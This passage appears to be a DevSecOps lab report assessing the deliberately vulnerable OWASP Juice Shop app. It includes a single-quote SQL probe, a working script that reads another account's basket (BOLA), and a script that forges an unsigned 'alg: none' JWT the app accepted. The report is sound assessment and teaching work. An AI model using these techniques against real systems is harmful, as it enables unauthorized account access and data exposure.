# WSL workstation
cd ~/project-2a/juice-shop-source
grep -n -C 5 'criteria\|literal\|query' routes/search.ts
sed -n '1,140p' routes/search.ts
grep -RIn --include='*.ts' 'req\.query\|sequelize\.literal' routes lib
```

This review found that `routes/search.ts` constructs a SQL expression using the product-search query value. It confirmed unsafe construction in source, but did not demonstrate data extraction.

Other ZAP API observations included server-error responses, unexpected content types, missing CSP, wildcard CORS, timestamps, and a private IP value in configuration output. The available evidence did not establish sensitive stack-trace disclosure, authenticated cross-origin data access, or secret exposure. The API and DAST appendices preserve the counts and examples with their limits.

I then inspected selected responses and kept tool evidence separate from manual evidence. A route returning `200` is not automatically a vulnerability: the response data and intended access policy matter.

Once the port-3001 tunnel returned HTTP 200, I checked selected API responses from **WSL**. I used read-only GET requests to compare status codes, headers, and response fields with ZAP's observations:

```bash
BASE='http://localhost:3001'
curl -sS -i --max-time 10 "$BASE/api/Quantitys/"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-configuration"
curl -sS -i --max-time 10 "$BASE/rest/admin/application-version"
curl -sS -i --max-time 10 "$BASE/rest/continue-code"
curl -sS -i --max-time 10 "$BASE/rest/languages"
curl -sS -i --max-time 10 "$BASE/rest/products/search?q=apple"
curl -sS -i --max-time 10 "$BASE/rest/user/whoami"
curl -sS -i --max-time 10 "$BASE/api/Users"
curl -sS -i --max-time 10 --get --data-urlencode 'name=Score Board' "$BASE/api/Challenges/"
curl -sS -D - -o /dev/null --max-time 10 \
  -H 'Origin: https://other-origin.example' "$BASE/api/Quantitys/"
```

I recorded HTTP status, selected response headers, and the body where available. I reviewed the application-configuration response for the disclosed IP/timestamp values and common secret-like property names; no secret was confirmed. `/api/Users` returned `401` anonymously. These requests do not change application state.

I also tried a normal search and a single-quote search during one unstable tunnel period. Both timed out, so I excluded those attempts from the injection evidence. The separate ZAP API Scan later produced the HTTP 500 alert on the quote-containing search, and the source review showed the unsafe SQL construction:

```bash
# WSL terminal; these were response checks, not data-extraction attempts.
BASE='http://localhost:3001'
curl -sS -i --max-time 10 --get --data-urlencode 'q=apple' \
  "$BASE/rest/products/search"
curl -sS -i --max-time 10 --get --data-urlencode "q='" \
  "$BASE/rest/products/search"
```

For example, the public `/api/Quantitys/` endpoint returned 56 inventory records with exact quantities and per-user purchase limits. This was recorded as a potential business-data exposure for an owner to assess, because the evidence did not define whether the lab intended those values to be public. The anonymous `/api/Users` request returned `401`, which was positive evidence that anonymous access was denied on that route.

### 5.2 I tested cross-account basket authorization

The automated API scan was unauthenticated, so it could not establish cross-account object authorization. Before sending a live request, I examined the basket route and its tests in the source checkout. The saved source output showed `GET /rest/basket/:id`, a basket lookup by the requested ID, and tests for cross-user access and forged JWTs. I use these commands to revisit those lines from the **WSL terminal**; the exact original source-search command was not retained:

```bash
cd ~/project-2a/juice-shop-source
grep -n -C 4 "app.get('/rest/basket/:id'" server.ts
sed -n '1,70p' routes/basket.ts
sed -n '40,125p' test/api/basket.test.ts
```

Source review gave me a test hypothesis, but I still needed a live response from the running container. My first login script through the WSL tunnel reached a socket but timed out waiting for a response. I moved this check to the **target VM**, where the container bridge had already returned HTTP 200. I used Account A and Account B, recorded each account's own basket ID, then issued read-only requests for the other account's basket. The output showed HTTP 200 in both directions and returned the other account's basket ID. This confirmed a lab Broken Object Level Authorization (BOLA) issue, recorded as **API-01** and linked to GitHub Issue #1.

The test demonstrated cross-account basket access. It did not inspect basket contents or attempt a state-changing operation, so the evidence is limited to the unauthorized object reference/read behavior observed.

Before running the account script on the **target VM**, I confirmed the existing container and its bridge address. The initial version of my script used `input()` for an email while its code was supplied through a heredoc; that returned `EOFError` because standard input was already feeding the script. I switched both prompts to `getpass.getpass()`, which reads from the terminal. The code below reconstructs the successful read-only sequence from the preserved outputs; the original full script was not saved. I use only the two accounts created for this lab:

```bash
sudo docker ps --filter name=juice-shop
CONTAINER_IP="$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' juice-shop)"
BASE="http://$CONTAINER_IP:3000"
curl -sS -o /dev/null -w 'Target bridge HTTP %{http_code}\n' \
  --max-time 5 "$BASE/"

login_account() {
  python3 - "$BASE" "$1" <<'PY'
import getpass
import json
import sys
import urllib.request

base, label = sys.argv[1], sys.argv[2]
email = getpass.getpass(f'Account {label} test email (hidden): ')
password = getpass.getpass(f'Account {label} password (hidden): ')
payload = json.dumps({'email': email, 'password': password}).encode()
request = urllib.request.Request(
    base + '/rest/user/login',
    data=payload,
    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
)
with urllib.request.urlopen(request, timeout=10) as response:
    result = json.load(response)
auth = result['authentication']
print(str(auth['token']) + '|' + str(auth['bid']))
PY
}

RESULT_A="$(login_account A)" || exit 1
TOKEN_A="${RESULT_A%%|*}"
BASKET_A="${RESULT_A#*|}"
RESULT_B="$(login_account B)" || exit 1
TOKEN_B="${RESULT_B%%|*}"
BASKET_B="${RESULT_B#*|}"

# I printed only HTTP status and the returned basket ID, not response contents.
export BASE TOKEN_A TOKEN_B BASKET_A BASKET_B
python3 - <<'PY'
import json
import os
import urllib.request

base = os.environ['BASE']
a, b = os.environ['BASKET_A'], os.environ['BASKET_B']
ta, tb = os.environ['TOKEN_A'], os.environ['TOKEN_B']
cases = [('A own', ta, a), ('B own', tb, b),
         ('A reads B', ta, b), ('B reads A', tb, a)]
for label, token, basket_id in cases:
    req = urllib.request.Request(
        f'{base}/rest/basket/{basket_id}',
        headers={'Authorization': f'Bearer {token}', 'Accept': 'application/json'},
    )
    with urllib.request.urlopen(req, timeout=10) as response:
        payload = json.load(response)
        returned_id = payload.get('data', {}).get('id')
        print(f'{label}: HTTP {response.status}; returned basket ID={returned_id}')
PY
```

The preserved terminal result was:

```text
Account A reading its own basket: HTTP 200; returned basket ID=6
Account B reading its own basket: HTTP 200; returned basket ID=7
Account A reading Account B's basket: HTTP 200; returned basket ID=7
Account B reading Account A's basket: HTTP 200; returned basket ID=6
```

I did not print bearer tokens or basket contents. This manual result answered an access-control question that the unauthenticated ZAP run did not cover.

### 5.3 I checked whether an unsigned JWT was accepted

I used a test account and sent a read-only basket request with an unsigned JWT (`alg: none`). The service returned HTTP 200 and a basket ID. This confirmed that the lab accepted an unsigned token for that protected read, recorded as **API-02** and linked to GitHub Issue #2. The broader consequences, such as using the token to impersonate other users or perform writes, were not tested.

I used the same Account A session for the token check on the **target VM**. The reconstructed command changes only the JWT header to `alg: none`, removes the signature, and sends a read-only basket request. The account token stays in a shell variable and is not saved in the repository:

```bash
export TOKEN_A
TOKEN_NONE="$(python3 - <<'PY'
import base64, json, os

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

parts = os.environ.get('TOKEN_A', '').split('.')
if len(parts) != 3:
    raise SystemExit('Expected a three-part JWT')
header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')).encode())
print(header + '.' + parts[1] + '.')
PY
)"
export BASE TOKEN_NONE BASKET_A
python3 - <<'PY'
import json
import os
import urllib.request

req = urllib.request.Request(
    f"{os.environ['BASE']}/rest/basket/{os.environ['BASKET_A']}",
    headers={'Authorization': f"Bearer {os.environ['TOKEN_NONE']}"},
)
with urllib.request.urlopen(req, timeout=10) as response:
    payload = json.load(response)
    print('Unsigned token: HTTP', response.status,
          '; returned basket ID=', payload.get('data', {}).get('id'))
PY
unset TOKEN_A TOKEN_B TOKEN_NONE RESULT_A RESULT_B BASKET_A BASKET_B BASE
```

The preserved terminal result was `Unsigned-token request: HTTP 200; returned basket ID=6`. I did not modify data.

**Safety and evidence note:** The purpose was to demonstrate authentication validation in the training app. I did not test real accounts or a production service, and I did not use the test to modify basket state.

### 5.4 I combined manual and tool results without treating them as duplicates

I kept the source of each result clear. My two-account BOLA and unsigned-JWT checks were manual; ZAP's unauthenticated API scan did not reproduce them. ZAP raised the product-search SQL alert, and I used source review to confirm unsafe query construction. For CORS and configuration behavior, I compared ZAP's repeated observations with my manual response checks rather than counting the same behavior twice.

The API appendix and consolidated assessment distinguish:

- **API-01:** confirmed cross-account basket read (manual, two accounts).
- **API-02:** unsigned JWT accepted on a protected basket read (manual).
- **API-03:** unsafe product-search SQL construction (ZAP signal plus source confirmation; runtime exploit effect not demonstrated).
- **API-04:** wildcard CORS policy observed; sensitive credentialed cross-origin access not demonstrated.
- **API-05:** configuration IP/timestamp metadata observed; no secret confirmed and sensitivity depends on owner context.
- **API-06:** malformed-request server errors observed by ZAP; no sensitive response body confirmed.
- **API-07/API-08:** content-type and CSP observations recorded as lower-confidence or lower-impact follow-up items.

## 6. Assessment handoff

### 6.1 I wrote findings for the teams who own remediation

My role in this lab was assessment and risk communication. The developers own source changes. The service owner supplies business context, assigns an accountable team, sets target dates, and decides whether any residual risk is accepted. DevSecOps makes the work actionable by preserving evidence, deduplicating results, explaining confidence, connecting findings to risk, and defining how a fix should be verified.

The repository contains the consolidated assessment report, SCA/SAST/DAST/API appendices, risk register, detailed SCA/SAST CSV, and first-pass triage. Six API remediation issues were created in GitHub Issues #1–#6. They link back to evidence and provide proposed acceptance and verification expectations. An issue is a handoff; it is not proof that a developer has fixed the problem.

### 6.2 I kept remediation and verification as future work

This lab stage stops after documenting and assigning follow-up. No Juice Shop source fixes were made. In a real delivery pipeline, the development team would implement changes, and DevSecOps would help define focused regression tests, rerun the relevant scanner or manual check against the fixed build, capture the result, and update the assessment and risk register. A service owner would close or accept the risk based on evidence and business context.

## What I learned

- A scan cannot begin until the right code, dependencies, target, and network path are available. `HTTP 000` and missing `node_modules` are setup failures, not security results.
- SCA needs dependency paths and build context; SAST needs source/path review; DAST needs a reachable running target; API authorization checks need authenticated identities and object-level test cases.
- Automation gives breadth and repeatability. Manual checks answer focused questions that an unauthenticated scanner cannot answer. Their evidence should be combined with provenance preserved.
- Juice Shop is deliberately vulnerable, so the lab shows how to assess and communicate issues rather than how to claim production risk without context.
- Finding a defect is one stage of DevSecOps. The process becomes useful when the evidence reaches the right engineering owner with a clear fix outcome and a way to verify it.

## Related Project 2A SCA, SAST and DAST Scanning records

- [Consolidated assessment report](assessment-report-inventory.md)
- [First-pass triage](triage-review.md)
- [Risk register](risk-register.md)
- [Detailed SCA/SAST register](risk-register-sca-sast.csv)
- [SCA individual findings](sca-individual-findings.md)
- [SAST individual findings](sast-individual-findings.md)
- [DAST individual findings](dast-individual-findings.md)
- [Manual API findings](manual-api-findings.md)

